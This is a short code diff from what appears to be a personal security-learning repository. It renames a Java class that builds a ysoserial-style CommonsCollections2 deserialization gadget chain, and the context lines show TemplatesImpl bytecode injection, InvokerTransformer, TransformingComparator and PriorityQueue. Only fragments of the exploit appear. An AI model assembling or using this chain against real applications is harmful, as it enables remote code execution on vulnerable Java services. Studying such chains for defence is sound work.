@@ -19,7 +19,7 @@ import static com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil.s
  * created by xjj on 2023/2/8
  */
 
-public class CommonCollections2Temp {
+public class CommonsCollections2Temp {
     // jdk8u71以及之后的版本使用
     public byte[] getPayload(String exp) throws Exception {
         class TFactory extends TransformerFactoryImpl {
@@ -30,7 +30,6 @@ public class CommonCollections2Temp {
         setFieldValue(templates, "_bytecodes", new byte[][]{code});
         setFieldValue(templates, "_tfactory", new TFactory());
         Transformer transformer = new InvokerTransformer("toString", null, null); // toString 没有用, 后面会替换掉
-
 
         TransformingComparator comparator = new TransformingComparator(transformer);
         PriorityQueue priorityQueue = new PriorityQueue(2, comparator);
@@ -49,6 +48,6 @@ public class CommonCollections2Temp {
     }
 
     public static void main(String[] args) throws Exception {
-        new CommonCollections2Temp().gadget();
+        new CommonsCollections2Temp().gadget();
     }
 }
